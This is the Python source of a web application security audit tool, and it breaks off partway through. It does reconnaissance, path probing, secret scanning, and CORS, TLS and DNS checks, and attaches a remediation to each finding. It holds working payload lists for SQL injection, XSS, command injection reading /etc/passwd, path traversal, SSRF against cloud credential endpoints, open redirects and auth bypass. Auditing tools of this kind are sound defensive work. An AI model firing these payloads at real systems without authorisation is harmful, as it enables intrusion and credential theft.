#!/usr/bin/env python3
"""
Web Application Security Audit Tool
====================================
Automated external black-box security assessment for web applications.
Performs reconnaissance, endpoint discovery, auth testing, header analysis,
data extraction, and PDF report generation.

Usage:
    python3 audit.py https://target-site.com
    python3 audit.py https://target-site.com --extract
    python3 audit.py https://target-site.com --extract --output /path/to/output
    python3 audit.py https://target-site.com --skip-extract --report-only

Requirements:
    pip3 install requests fpdf2 beautifulsoup4
"""

import argparse
import base64
import csv
import json
import os
import re
import ssl
import socket
import subprocess
import sys
import threading
import time
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

try:
    import requests
    from requests.exceptions import RequestException, Timeout
except ImportError:
    sys.exit("Missing dependency: pip3 install requests")

try:
    from fpdf import FPDF
except ImportError:
    sys.exit("Missing dependency: pip3 install fpdf2")

try:
    from bs4 import BeautifulSoup
except ImportError:
    sys.exit("Missing dependency: pip3 install beautifulsoup4")


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

REQUEST_TIMEOUT = 15
MAX_RETRIES = 2
USER_AGENT = "SecurityAudit/1.0"
RATE_LIMIT_DELAY = 0.3  # seconds between requests to avoid overwhelming target

COMMON_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/package.json", "/composer.json",
    "/wp-config.php.bak", "/server.js", "/app.js", "/.well-known/security.txt",
    "/security.txt", "/robots.txt", "/sitemap.xml", "/.htaccess", "/.DS_Store",
    "/config.json", "/config.yml", "/config.yaml", "/database.yml",
    "/Dockerfile", "/docker-compose.yml", "/.dockerenv",
    "/phpinfo.php", "/info.php", "/test.php", "/debug", "/trace",
    "/actuator", "/actuator/health", "/actuator/env",  # Spring Boot
    "/swagger", "/swagger-ui", "/swagger-ui.html", "/api-docs", "/swagger.json",
    "/openapi.json", "/docs", "/redoc",
    "/graphql", "/graphiql", "/_graphql",
    "/admin", "/admin/", "/dashboard", "/login", "/register", "/signup",
    "/wp-admin", "/wp-login.php", "/administrator",
    "/api", "/api/v1", "/api/v2", "/api/health", "/api/status", "/api/config",
    "/api/users", "/api/admin", "/api/auth", "/api/login",
    "/api/products", "/api/orders", "/api/customers",
    "/status", "/health", "/healthz", "/ready", "/info", "/metrics", "/stats",
    "/node_modules", "/vendor", "/uploads", "/backup", "/backups", "/dump",
    "/phpmyadmin", "/adminer", "/console", "/_profiler",
    "/elmah.axd", "/trace.axd",  # .NET
    "/server-status", "/server-info",  # Apache
    "/nginx_status",  # Nginx
    # Extended discovery
    "/.svn/entries", "/.hg/store",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.well-known/openid-configuration",
    "/wp-content/debug.log", "/error_log", "/errors.log",
    "/wp-json/wp/v2/users",
    "/api/v3", "/api/internal", "/api/debug", "/api/env",
    "/cgi-bin/", "/cgi-bin/test-cgi",
    "/log/", "/logs/", "/tmp/",
    "/.bash_history", "/.ssh/id_rsa",
    "/server.xml", "/web.xml",
    "/api/swagger.json", "/api/openapi.json",
    "/api/swagger/v1/swagger.json",
    "/.well-known/assetlinks.json",
    "/api/settings", "/api/version", "/api/info",
    "/debug/vars", "/debug/pprof",  # Go debug
    "/_debug/", "/__debug__/",
    "/application.yml", "/application.properties",  # Spring
    "/env", "/env.json", "/config.js",
]

CORS_ORIGINS = [
    "https://evil.com",
    "null",
    "https://attacker.com",
]

SECURITY_HEADERS = {
    "Content-Security-Policy":      ("HIGH",   "Prevents XSS and injection attacks"),
    "Strict-Transport-Security":    ("HIGH",   "Enforces HTTPS connections"),
    "X-Content-Type-Options":       ("MEDIUM", "Prevents MIME type sniffing"),
    "X-Frame-Options":              ("MEDIUM", "Prevents clickjacking"),
    "Cross-Origin-Opener-Policy":   ("MEDIUM", "Isolates browsing context"),
    "Cross-Origin-Resource-Policy": ("MEDIUM", "Controls cross-origin resource loading"),
    "Referrer-Policy":              ("LOW",    "Controls referrer information leakage"),
    "Permissions-Policy":           ("LOW",    "Restricts browser feature access"),
    "X-XSS-Protection":             ("LOW",    "Legacy XSS protection (still recommended)"),
}

HEADER_REMEDIATIONS = {
    "Content-Security-Policy": (
        "Add Content-Security-Policy header. Start with: "
        "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'"
    ),
    "Strict-Transport-Security": (
        "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
    ),
    "X-Content-Type-Options": "Add: X-Content-Type-Options: nosniff",
    "X-Frame-Options": (
        "Add: X-Frame-Options: DENY (or SAMEORIGIN if same-origin framing is required)"
    ),
    "Referrer-Policy": "Add: Referrer-Policy: strict-origin-when-cross-origin",
    "Permissions-Policy": (
        "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"
    ),
    "X-XSS-Protection": "Add: X-XSS-Protection: 1; mode=block",
    "Cross-Origin-Opener-Policy": "Add: Cross-Origin-Opener-Policy: same-origin",
    "Cross-Origin-Resource-Policy": "Add: Cross-Origin-Resource-Policy: same-origin",
}

AUTH_BYPASS_PAYLOADS = [
    ("empty string", {"password": ""}),
    ("null", {"password": None}),
    ("boolean true", {"password": True}),
    ("array", {"password": []}),
    ("object", {"password": {}}),
    ("nosql injection", {"password": {"$gt": ""}}),
    ("no field", {}),
    ("number zero", {"password": 0}),
    ("sql-like", {"password": "' OR '1'='1"}),
]

WRITE_METHODS = ["POST", "PUT", "PATCH", "DELETE"]

# --- Injection Testing Payloads ---

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL--",
    "1; DROP TABLE test--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' OR '1'='1' /*",
]

SQLI_ERROR_SIGNATURES = [
    "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
    "microsoft sql", "odbc", "syntax error", "unclosed quotation",
    "unterminated string", "pg_query", "mysql_fetch",
    "you have an error in your sql", "warning: mysql",
    "valid mysql result", "mysqlclient", "sqlstate",
    "jdbc", "quoted string not properly terminated",
]

XSS_PAYLOADS = [
    "<script>xss</script>",
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<img src=x onerror=prompt(1)>",
]

CMDI_PAYLOADS = [
    "; whoami",
    "| id",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMDI_SIGNATURES = [
    "root:", "uid=", "gid=", "groups=", "www-data", "nobody",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....%2f....%2fetc%2fpasswd",
]

PATH_TRAVERSAL_SIGS = [
    "root:", "[boot loader]", "[fonts]", "for 16-bit app support",
    "/bin/bash", "/bin/sh",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("#{7*7}", "49"),
]

SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//evil.com/%2f..",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
]

REDIRECT_PARAM_NAMES = [
    "redirect", "return", "next", "url", "redir",
    "redirect_uri", "return_url", "continue", "dest",
    "destination", "go", "target", "to", "out", "view",
    "returnTo", "return_to",
]

# --- WAF Detection ---

WAF_SIGNATURES = {
    "cloudflare": {"headers": ["cf-ray", "cf-cache-status"], "body": ["cloudflare"]},
    "aws_waf": {"headers": ["x-amzn-requestid"], "body": ["request blocked"]},
    "akamai": {"headers": ["x-akamai-session-info", "akamai-grn"], "body": ["akamai"]},
    "modsecurity": {"headers": [], "body": ["mod_security", "modsecurity", "not acceptable"]},
    "imperva": {"headers": ["x-iinfo", "x-cdn"], "body": ["incapsula"]},
    "sucuri": {"headers": ["x-sucuri-id", "x-sucuri-cache"], "body": ["sucuri"]},
    "f5_bigip": {"headers": ["x-cnection", "x-wa-info"], "body": ["the requested url was rejected"]},
    "barracuda": {"headers": ["barra_counter_session"], "body": ["barracuda"]},
}

# --- Subdomain Enumeration ---

COMMON_SUBDOMAINS = [
    "api", "admin", "staging", "dev", "test", "beta", "app",
    "dashboard", "mail", "ftp", "vpn", "git", "ci", "cd",
    "jenkins", "grafana", "kibana", "elastic", "redis",
    "mongo", "postgres", "mysql", "minio", "s3",
    "www", "ns1", "ns2", "mx", "smtp", "pop",
    "internal", "portal", "docs", "wiki", "jira",
]

# --- Mass Assignment ---

MASS_ASSIGNMENT_FIELDS = {
    "isAdmin": True,
    "role": "admin",
    "verified": True,
    "approved": True,
    "is_superuser": True,
    "permissions": ["admin", "write", "delete"],
    "email_verified": True,
    "active": True,
}

# --- JWT ---

JWT_SENSITIVE_CLAIMS = [
    "password", "passwd", "pass", "secret", "ssn",
    "credit_card", "card_number", "cvv", "pin",
    "private_key", "api_key", "access_key",
]

GRAPHQL_INTROSPECTION_QUERY = (
    '{"query":"{__schema{types{name,fields{name,type{name,kind}}}'
    'mutationType{fields{name}}}}"}'
)


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

class Logger:
    """Simple colored console logger."""
    COLORS = {
        "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
        "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
        "bold": "\033[1m", "reset": "\033[0m",
    }

    @staticmethod
    def _c(color, text):
        return f"{Logger.COLORS.get(color, '')}{text}{Logger.COLORS['reset']}"

    @staticmethod
    def banner(text):
        print(f"\n{Logger._c('bold', Logger._c('cyan', '=' * 60))}")
        print(f"{Logger._c('bold', Logger._c('cyan', f'  {text}'))}")
        print(f"{Logger._c('bold', Logger._c('cyan', '=' * 60))}")

    @staticmethod
    def section(text):
        print(f"\n{Logger._c('bold', Logger._c('blue', f'[*] {text}'))}")

    @staticmethod
    def finding(severity, text):
        colors = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "cyan", "INFO": "blue"}
        color = colors.get(severity, "blue")
        print(f"  {Logger._c('bold', Logger._c(color, f'[{severity}]'))} {text}")

    @staticmethod
    def ok(text):
        print(f"  {Logger._c('green', '[OK]')} {text}")

    @staticmethod
    def info(text):
        print(f"  {Logger._c('blue', '[i]')} {text}")

    @staticmethod
    def warn(text):
        print(f"  {Logger._c('yellow', '[!]')} {text}")

    @staticmethod
    def error(text):
        print(f"  {Logger._c('red', '[ERROR]')} {text}")

    @staticmethod
    def progress(current, total, prefix=""):
        bar_len = 30
        filled = int(bar_len * current / max(total, 1))
        bar = "=" * filled + "-" * (bar_len - filled)
        sys.stdout.write(f"\r  {prefix} [{bar}] {current}/{total}")
        sys.stdout.flush()
        if current >= total:
            print()


log = Logger()


def make_session(target_url, bearer_token=None, cookie=None,
                 api_key=None, api_key_header="X-API-Key"):
    """Create a requests session with standard config and optional auth credentials."""
    s = requests.Session()
    s.headers.update({"User-Agent": USER_AGENT})
    if bearer_token:
        s.headers.update({"Authorization": f"Bearer {bearer_token}"})
    if cookie:
        s.headers.update({"Cookie": cookie})
    if api_key:
        s.headers.update({api_key_header: api_key})
    s.verify = True
    s.timeout = REQUEST_TIMEOUT
    return s


def safe_request(session, method, url, **kwargs):
    """Make an HTTP request with retry logic and rate limiting."""
    kwargs.setdefault("timeout", REQUEST_TIMEOUT)
    for attempt in range(MAX_RETRIES + 1):
        try:
            time.sleep(RATE_LIMIT_DELAY)
            resp = session.request(method, url, **kwargs)
            return resp
        except Timeout:
            if attempt < MAX_RETRIES:
                time.sleep(1)
                continue
            return None
        except RequestException:
            return None
    return None


def is_same_content(resp, baseline_hash):
    """Check if a response is just the SPA catch-all (same as homepage)."""
    if resp is None:
        return True
    return hash(resp.content) == baseline_hash


# ---------------------------------------------------------------------------
# Phase 1: Reconnaissance
# ---------------------------------------------------------------------------

def recon_headers(session, target):
    """Analyze HTTP response headers for security issues."""
    log.section("HTTP Response Header Analysis")
    findings = []

    resp = safe_request(session, "GET", target)
    if resp is None:
        log.error("Could not connect to target")
        return [], {}

    headers = dict(resp.headers)

    # Technology disclosure
    tech_headers = ["X-Powered-By", "Server", "X-AspNet-Version",
                    "X-AspNetMvc-Version", "X-Generator", "X-Drupal-Cache"]
    for h in tech_headers:
        if h.lower() in [k.lower() for k in headers]:
            val = next(v for k, v in headers.items() if k.lower() == h.lower())
            log.finding("MEDIUM", f"Technology disclosure: {h}: {val}")
            findings.append({
                "title": f"Technology Disclosure via {h} Header",
                "severity": "MEDIUM",
                "detail": f"The server returns '{h}: {val}', revealing backend technology.",
                "evidence": f"{h}: {val}",
                "remediation": (
                    f"Remove or suppress the {h} header in your web server or framework config. "
                    "For Express.js: use helmet() or app.disable('x-powered-by'). "
                    "For Nginx: set server_tokens off;"
                ),
            })

    # Missing security headers
    for header, (severity, purpose) in SECURITY_HEADERS.items():
        found = any(k.lower() == header.lower() for k in headers)
        if not found:
            log.finding(severity, f"Missing header: {header}")
            findings.append({
                "title": f"Missing {header} Header",
                "severity": severity,
                "detail": f"{header} is not set. Purpose: {purpose}.",
                "evidence": "Header absent from response",
                "remediation": HEADER_REMEDIATIONS.get(header, f"Add the {header} response header."),
            })
        else:
            log.ok(f"Present: {header}")

    # Cookie security
    cookies = resp.headers.get("Set-Cookie", "")
    if cookies:
        if "secure" not in cookies.lower():
            findings.append({"title": "Cookie missing Secure flag", "severity": "MEDIUM",
                             "detail": "Cookies sent without Secure flag may be transmitted over HTTP.",
                             "evidence": cookies,
                             "remediation": "Set the Secure flag on all cookies: Set-Cookie: name=value; Secure; HttpOnly; SameSite=Strict"})
        if "httponly" not in cookies.lower():
            findings.append({"title": "Cookie missing HttpOnly flag", "severity": "MEDIUM",
                             "detail": "Cookies without HttpOnly can be accessed by JavaScript (XSS risk).",
                             "evidence": cookies,
                             "remediation": "Set the HttpOnly flag on all session cookies to prevent JavaScript access."})
        if "samesite" not in cookies.lower():
            findings.append({"title": "Cookie missing SameSite attribute", "severity": "LOW",
                             "detail": "Without SameSite, cookies may be sent in cross-site requests (CSRF risk).",
                             "evidence": cookies,
                             "remediation": "Add SameSite=Strict (or Lax for cross-site GET flows) to all cookie directives."})

    return findings, headers


def recon_tls(target):
    """Check TLS certificate and protocol support."""
    log.section("TLS/SSL Analysis")
    findings = []
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or 443

    # Certificate info
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(10)
            s.connect((host, port))
            cert = s.getpeercert()
            protocol = s.version()

        issuer = dict(x[0] for x in cert.get("issuer", []))
        subject = dict(x[0] for x in cert.get("subject", []))
        not_after = cert.get("notAfter", "")
        log.info(f"Certificate CN: {subject.get('commonName', 'N/A')}")
        log.info(f"Issuer: {issuer.get('organizationName', 'N/A')}")
        log.info(f"Expires: {not_after}")
        log.info(f"Protocol: {protocol}")

        # Check expiry
        try:
            exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            days_left = (exp - datetime.utcnow()).days
            if days_left < 30:
                log.finding("HIGH", f"Certificate expires in {days_left} days")
                findings.append({"title": "Certificate Nearing Expiry",
                                 "severity": "HIGH",
                                 "detail": f"Certificate expires in {days_left} days ({not_after}).",
                                 "evidence": f"notAfter: {not_after}",
                                 "remediation": "Renew the TLS certificate immediately. Consider using Let's Encrypt with auto-renewal (certbot renew --cron)."})
        except ValueError:
            pass

    except Exception as e:
        log.error(f"TLS check failed: {e}")

    # Check HTTP -> HTTPS redirect
    if parsed.scheme == "https":
        http_url = target.replace("https://", "http://", 1)
        try:
            resp = requests.get(http_url, allow_redirects=False, timeout=10,
                                headers={"User-Agent": USER_AGENT})
            if resp.status_code in (301, 302, 307, 308):
                location = resp.headers.get("Location", "")
                if location.startswith("https://"):
                    log.ok(f"HTTP->HTTPS redirect: {resp.status_code}")
                else:
                    log.finding("HIGH", "HTTP does not redirect to HTTPS")
                    findings.append({"title": "No HTTPS Redirect", "severity": "HIGH",
                                     "detail": "HTTP requests are not redirected to HTTPS.",
                                     "evidence": f"HTTP {resp.status_code}, Location: {location}",
                                     "remediation": "Configure a permanent 301 redirect from HTTP to HTTPS. For Nginx: return 301 https://$host$request_uri; For Apache: RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]"})
            else:
                log.finding("MEDIUM", f"HTTP returns {resp.status_code} (no redirect)")
                findings.append({"title": "HTTP Not Redirecting to HTTPS", "severity": "MEDIUM",
                                 "detail": f"HTTP returns status {resp.status_code} instead of redirecting.",
                                 "evidence": f"Status: {resp.status_code}",
                                 "remediation": "Add a server-level redirect rule to forward all HTTP traffic to HTTPS."})
        except Exception:
            log.info("Could not test HTTP redirect (port 80 may be closed)")

    return findings


def recon_cors(session, target):
    """Test CORS configuration."""
    log.section("CORS Policy Testing")
    findings = []

    for origin in CORS_ORIGINS:
        resp = safe_request(session, "GET", target, headers={"Origin": origin})
        if resp is None:
            continue
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        if acao:
            if acao == "*":
                log.finding("MEDIUM", f"CORS wildcard: Access-Control-Allow-Origin: *")
                findings.append({"title": "CORS Wildcard Origin",
                                 "severity": "MEDIUM" if acac.lower() != "true" else "HIGH",
                                 "detail": "The server allows any origin via wildcard.",
                                 "evidence": f"Origin: {origin} -> ACAO: {acao}",
                                 "remediation": "Replace the wildcard with an explicit allowlist of trusted origins. Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true."})
            elif acao == origin:
                sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
                log.finding(sev, f"CORS reflects origin: {origin} (credentials: {acac})")
                findings.append({"title": "CORS Origin Reflection",
                                 "severity": sev,
                                 "detail": f"Server reflects arbitrary origin '{origin}' in ACAO header."
                                           + (" With credentials allowed, this enables full cross-origin data theft."
                                              if acac.lower() == "true" else ""),
                                 "evidence": f"Origin: {origin} -> ACAO: {acao}, ACAC: {acac}",
                                 "remediation": "Validate the Origin header against a strict allowlist before reflecting it. Do not dynamically mirror the incoming Origin value."})

    if not findings:
        log.ok("No permissive CORS policy detected")

    return findings


def detect_waf(session, target):
    """Detect presence of a Web Application Firewall."""
    log.section("WAF Detection")
    findings = []
    detected = []

    # Check baseline response headers for WAF signatures
    resp_clean = safe_request(session, "GET", target)
    # Send a malicious-looking request to trigger WAF
    resp_dirty = safe_request(session, "GET", target,
                              params={"q": "' OR 1=1--<script>alert(1)</script>"})

    for resp in [r for r in [resp_clean, resp_dirty] if r is not None]:
        hdrs_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body_lower = resp.text[:2000].lower()
        for waf_name, sigs in WAF_SIGNATURES.items():
            if waf_name in detected:
                continue
            if any(h in hdrs_lower for h in sigs["headers"]):
                detected.append(waf_name)
            elif any(s in body_lower for s in sigs["body"]):
                detected.append(waf_name)

    if detected:
        names = ", ".join(detected)
        log.finding("INFO", f"WAF detected: {names}")
        findings.append({
            "title": f"WAF Detected: {names}",
            "severity": "INFO",
            "detail": f"A Web Application Firewall ({names}) is protecting the target.",
            "evidence": f"Detected via header/body signatures",
            "remediation": "WAF is a positive security measure. Ensure rules are kept up to date.",
        })
    else:
        log.finding("MEDIUM", "No WAF detected")
        findings.append({
            "title": "No WAF Protection Detected",
            "severity": "MEDIUM",
            "detail": "No Web Application Firewall was detected protecting the application.",
            "evidence": "No WAF signatures found in response headers or body",
            "remediation": "Consider deploying a WAF (e.g. Cloudflare, AWS WAF, ModSecurity) to filter malicious traffic.",
        })

    return findings


def recon_dns(target):
    """Check DNS security records (SPF, DMARC, zone transfer)."""
    log.section("DNS Security Analysis")
    findings = []
    parsed = urlparse(target)
    domain = parsed.hostname

    def _dig(args):
        try:
            result = subprocess.run(
                ["dig"] + args, capture_output=True, text=True, timeout=10)
            return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return None

    # SPF check
    spf_out = _dig(["TXT", domain, "+short"])
    if spf_out is not None:
        if "v=spf1" in spf_out:
            log.ok(f"SPF record found")
        else:
            log.finding("MEDIUM", "No SPF record found")
            findings.append({
                "title": "Missing SPF Record",
                "severity": "MEDIUM",
                "detail": "No SPF TXT record found. Email spoofing for this domain is possible.",
                "evidence": f"dig TXT {domain} returned no v=spf1 record",
                "remediation": f'Add a TXT record: {domain} IN TXT "v=spf1 include:_spf.google.com ~all" (adjust for your mail provider).',
            })
    else:
        log.info("dig command not available, skipping DNS checks")
        return findings

    # DMARC check
    dmarc_out = _dig(["TXT", f"_dmarc.{domain}", "+short"])
    if dmarc_out is not None:
        if "v=DMARC1" in dmarc_out:
            log.ok("DMARC record found")
        else:
            log.finding("MEDIUM", "No DMARC record found")
            findings.append({
                "title": "Missing DMARC Record",
                "severity": "MEDIUM",
                "detail": "No DMARC record found. The domain is vulnerable to email spoofing attacks.",
                "evidence": f"dig TXT _dmarc.{domain} returned no v=DMARC1 record",
                "remediation": f'Add: _dmarc.{domain} IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@{domain}"',
            })

    # Wildcard DNS check
    random_sub = f"randomauditcheck98765.{domain}"
    try:
        socket.getaddrinfo(random_sub, None)
        log.finding("INFO", "Wildcard DNS detected (random subdomain resolves)")
        findings.append({
            "title": "Wildcard DNS Record Detected",
            "severity": "INFO",
            "detail": "A wildcard DNS record exists — any subdomain resolves to an IP address.",
            "evidence": f"{random_sub} resolves successfully",
            "remediation": "Wildcard DNS can expose unintended services. Ensure only intended subdomains are served.",
        })
    except socket.gaierror:
        log.ok("No wildcard DNS")

    # Zone transfer check
    ns_out = _dig(["NS", domain, "+short"])
    if ns_out:
        for ns in ns_out.strip().split("\n"):
            ns = ns.strip().rstrip(".")
            if not ns:
                continue
            axfr = _dig(["AXFR", f"@{ns}", domain])
            if axfr and "XFR size:" in axfr and "0 records" not in axfr:
                log.finding("HIGH", f"DNS zone transfer allowed on {ns}")
                findings.append({
                    "title": f"DNS Zone Transfer Allowed ({ns})",
                    "severity": "HIGH",
                    "detail": f"Nameserver {ns} allows zone transfers, exposing all DNS records.",
                    "evidence": axfr[:500],
                    "remediation": "Restrict zone transfers to authorized secondary nameservers only (allow-transfer ACL).",
                })
                break

    return findings


# ---------------------------------------------------------------------------
# Phase 2: Endpoint Discovery
# ---------------------------------------------------------------------------

def probe_path(session, target, path, baseline_hash):
    """Probe a single path and return a result dict, or None if not interesting."""
    url = urljoin(target, path)
    resp = safe_request(session, "GET", url)
    if resp is None or resp.status_code == 404:
        return None
    if is_same_content(resp, baseline_hash):
        return None
    content_len = len(resp.content)
    if content_len == 0:
        return None
    return {
        "path": path,
        "status": resp.status_code,
        "content_type": resp.headers.get("Content-Type", ""),
        "size": content_len,
        "snippet": resp.text[:200],
    }


def discover_paths(session, target, baseline_hash):
    """Probe common paths for exposed resources (parallelized)."""
    log.section("Path Enumeration")
    found = []
    counter = [0]
    lock = threading.Lock()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(probe_path, session, target, path, baseline_hash): path
            for path in COMMON_PATHS
        }
        for future in as_completed(futures):
            result = future.result()
            with lock:
                counter[0] += 1
                log.progress(counter[0], len(COMMON_PATHS), "Probing paths")
                if result:
                    found.append(result)
                    log.finding(
                        "INFO",
                        f"{result['status']} {result['path']} "
                        f"({result['size']}B, {result['content_type']})",
                    )

    return found


def discover_js_endpoints(session, target):
    """Parse HTML for JS bundles, then extract API routes from them."""
    log.section("JavaScript Bundle Analysis")
    api_routes = []
    all_urls = []
    tech_info = {}
    js_file_urls = []

    resp = safe_request(session, "GET", target)
    if resp is None:
        return api_routes, all_urls, tech_info, js_file_urls

    html = resp.text
    soup = BeautifulSoup(html, "html.parser")

    # Detect technology from HTML
    if "react" in html.lower() or 'id="root"' in html:
        tech_info["frontend"] = "React"
    if "ng-app" in html or "ng-version" in html:
        tech_info["frontend"] = "Angular"
    if "__nuxt" in html or "__NUXT" in html:
        tech_info["frontend"] = "Nuxt.js (Vue)"
    if "__next" in html or "__NEXT" in html:
        tech_info["frontend"] = "Next.js (React)"
    if "svelte" in html.lower():
        tech_info["frontend"] = "Svelte"

    # Find JS files
    scripts = soup.find_all("script", src=True)
    js_urls = [urljoin(target, s["src"]) for s in scripts if s.get("src")]
    js_file_urls = list(js_urls)

    # Also check for CSS link tags (may reveal build tools)
    links = soup.find_all("link", rel="stylesheet")
    for link in links:
        href = link.get("href", "")
        if "assets/" in href:
            tech_info["build_tool"] = "Vite" if "assets/" in href else "Webpack"

    log.info(f"Found {len(js_urls)} JavaScript files")

    for js_url in js_urls:
        log.info(f"Analyzing: {js_url}")
        resp = safe_request(session, "GET", js_url)
        if resp is None or resp.status_code != 200:
            continue

        js_code = resp.text

        # Extract API routes
        route_patterns = [
            r'["\'](/api/[a-zA-Z0-9/_\-:.]+)["\']',
            r'["\'](/v[0-9]+/[a-zA-Z0-9/_\-:.]+)["\']',
            r'["\'](/graphql)["\']',
        ]
        for pattern in route_patterns:
            for match in re.findall(pattern, js_code):
                clean = re.sub(r'["\']', '', match).split('?')[0]
                if clean not in api_routes:
                    api_routes.append(clean)

        # Extract fetch() calls for method + body analysis
        fetch_calls = re.findall(r'fetch\([^)]{0,500}\)', js_code)
        for fc in fetch_calls:
            if "/api/" in fc or "/v1/" in fc or "/v2/" in fc:
                if fc not in all_urls:
                    all_urls.append(fc)

        # Extract external URLs
        ext_urls = re.findall(r'https?://[^\s"\'`<>\\)]+', js_code)
        for u in ext_urls:
            if u not in all_urls and not any(x in u for x in ["w3.org", "reactjs.org", "github.com/facebook"]):
                all_urls.append(u)

        # Look for hardcoded secrets patterns
        secret_patterns = [
            (r'["\']sk_(?:live|test)_[a-zA-Z0-9]+["\']', "Stripe Secret Key"),
            (r'["\']pk_(?:live|test)_[a-zA-Z0-9]+["\']', "Stripe Publishable Key"),
            (r'["\']AIza[a-zA-Z0-9_-]{35}["\']', "Google API Key"),
            (r'["\']AKIA[A-Z0-9]{16}["\']', "AWS Access Key ID"),
            (r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', "JWT Token"),
            (r'["\'][a-f0-9]{32}["\']', "Possible API Key (32-char hex)"),
            (r'(?:password|secret|api_key|apikey|token)\s*[:=]\s*["\'][^"\']{8,}["\']', "Hardcoded Secret"),
            (r'firebase[a-zA-Z]*\.googleapis\.com', "Firebase Endpoint"),
            (r'supabase\.co', "Supabase Endpoint"),
            (r'mongodb(?:\+srv)?://[^\s"\']+', "MongoDB Connection String"),
            (r'postgres(?:ql)?://[^\s"\']+', "PostgreSQL Connection String"),
            (r'redis://[^\s"\']+', "Redis Connection String"),
        ]
        for pattern, name in secret_patterns:
            matches = re.findall(pattern, js_code)
            if matches:
                for m in matches[:3]:  # limit output
                    log.finding("HIGH", f"Potential {name}: {m[:60]}...")
                    tech_info[f"secret_{name}"] = m[:100]

        # Detect React version
        react_match = re.search(r'"react"[^"]*"(\d+\.\d+\.\d+)"', js_code)
        if not react_match:
            react_match = re.search(r'react\.production\.min.*?(\d+\.\d+\.\d+)', js_code)
        if react_match:
            tech_info["react_version"] = react_match.group(1)

    log.info(f"Discovered {len(api_routes)} API routes from JS bundles")
    for r in sorted(api_routes):
        log.info(f"  {r}")

    return api_routes, all_urls, tech_info, js_file_urls


def parse_openapi_spec(session, target, found_paths):
    """Discover additional API routes by parsing any OpenAPI/Swagger spec files found."""
    log.section("OpenAPI/Swagger Spec Discovery")
    routes = []

    # Candidates from path enumeration results
    spec_paths_found = {fp["path"] for fp in found_paths if fp.get("status") == 200}
    candidates = [
        p for p in spec_paths_found
        if any(x in p for x in ["swagger", "openapi", "api-docs", "api-spec"])
    ]
    # Also probe common locations not already confirmed present
    for path in ["/swagger.json", "/openapi.json", "/api-docs",
                 "/swagger/v1/swagger.json", "/v2/api-docs"]:
        if path not in spec_paths_found:
            candidates.append(path)

    for candidate in candidates:
        url = urljoin(target, candidate)
        resp = safe_request(session, "GET", url, headers={"Accept": "application/json"})
        if resp is None or resp.status_code != 200:
            continue
        try:
            spec = resp.json()
        except (json.JSONDecodeError, ValueError):
            continue

        # OpenAPI 2.x (Swagger) and 3.x both use "paths"
        paths = spec.get("paths", {})
        if not paths:
            continue

        log.info(f"Parsed OpenAPI spec from {candidate}: {len(paths)} paths")
        for path_key in paths:
            # Normalize path params: /users/{id} -> /users/:id
            normalized = re.sub(r"\{[^}]+\}", ":id", path_key)
            if normalized not in routes:
                routes.append(normalized)
                log.info(f"  Spec route: {normalized}")

    if routes:
        log.finding("INFO", f"OpenAPI spec revealed {len(routes)} additional routes")
    else:
        log.ok("No parseable OpenAPI/Swagger spec found")

    return routes


def parse_robots_and_sitemap(session, target, found_paths):
    """Parse robots.txt and sitemap.xml for additional paths/routes."""
    log.section("Robots.txt / Sitemap.xml Parsing")
    extra_paths = []
    extra_api_routes = []

    # Parse robots.txt
    robots_found = [fp for fp in found_paths if fp["path"] == "/robots.txt" and fp["status"] == 200]
    if robots_found:
        resp = safe_request(session, "GET", urljoin(target, "/robots.txt"))
        if resp and resp.status_code == 200:
